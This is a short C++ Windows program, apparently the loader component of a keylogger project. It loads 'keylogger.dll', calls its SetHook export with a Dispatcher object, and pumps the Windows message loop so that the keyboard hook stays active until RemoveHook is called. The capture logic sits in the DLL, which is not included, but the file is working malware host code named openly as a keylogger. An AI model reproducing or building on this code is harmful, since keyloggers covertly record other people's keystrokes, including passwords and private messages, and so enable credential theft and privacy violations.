#include <iostream>
#include <string>
#include <thread>

#include "Dispatcher.hpp"
#include <Windows.h>


typedef void(__stdcall *pFunc)(void);
typedef void(__stdcall *hook)(Dispatcher *);

int	main(int ac, char **av)
{
	HMODULE hDll = NULL;
	hook ptrHook = NULL;
	pFunc ptrFunc = NULL;

	SetLastError(0);

	if ((hDll = LoadLibrary("keylogger.dll")) == NULL
		|| (ptrHook = (hook)GetProcAddress(hDll, "SetHook")) == NULL)
	{
		std::cerr << GetLastError() << std::endl;
		Sleep(1000);
		return (1);
	}
	ptrHook(new Dispatcher);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	if ((ptrFunc = (pFunc)GetProcAddress(hDll, "RemoveHook")) == NULL)
	{
		std::cerr << GetLastError() << std::endl;
		return (1);
	}
	ptrFunc();
	FreeLibrary(hDll);
	return (0);
}